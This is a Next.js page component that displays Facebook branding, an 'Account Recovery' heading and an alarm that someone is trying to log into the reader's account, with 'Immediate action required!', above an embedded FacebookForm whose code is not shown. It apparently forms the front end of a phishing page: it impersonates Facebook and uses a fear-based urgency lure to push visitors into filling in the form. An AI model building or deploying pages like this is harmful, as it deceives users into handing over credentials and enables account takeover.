import FacebookForm from "@/components/shared/FacebookForm";
import Image from "next/image";

export default function Home() {
  return (
    <div className="flex justify-start pt-10 items-center w-full h-screen flex-col bg-slate-200">
      <Image src={"/facebook.svg"} width={250} height={60} alt="facebooksvg" className="object-contain mb-8" />
      <div className="py-3 pt-5 rounded-lg  shadow-black/20 border-primary/30 shadow-xl  lg:w-[450px] bg-white">
        <h1 className="font-semibold text-center text-2xl mb-1">Account Recovery</h1>
        <h4 className="text-center text-slate-600 leading-5 px-20 mb-3">
          Someone trying to log into your account, <strong className="text-red-900/70 text-[15px]">Immediate action required!</strong>
        </h4>
        <hr />
        <div className="py-5">
          <FacebookForm />
        </div>
      </div>
    </div>
  );
}


